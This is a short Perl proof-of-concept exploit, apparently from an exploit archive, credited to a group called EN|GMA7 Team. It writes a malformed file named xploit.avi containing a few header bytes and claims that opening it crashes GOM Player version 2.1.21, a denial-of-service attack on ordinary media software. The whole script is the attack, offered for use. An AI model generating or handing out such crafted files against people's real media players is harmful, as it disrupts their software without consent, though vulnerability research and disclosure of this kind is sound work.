#!/usr/bin/perl

print "
[~] GOM PLAYER V 2.1.21 -last- DoS (.avi file)
[~] EN|GMA7 Team ~
[~] By Z
[~] www.enigma7.net<http://www.enigma7.net>
";


$bf = "\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00";

open(file, "> xploit.avi");
print (file $bf);
print "\n\n[+] Done!\n
[+] AVI file created..\n
[+] Z-at-Enigma7.net\n";
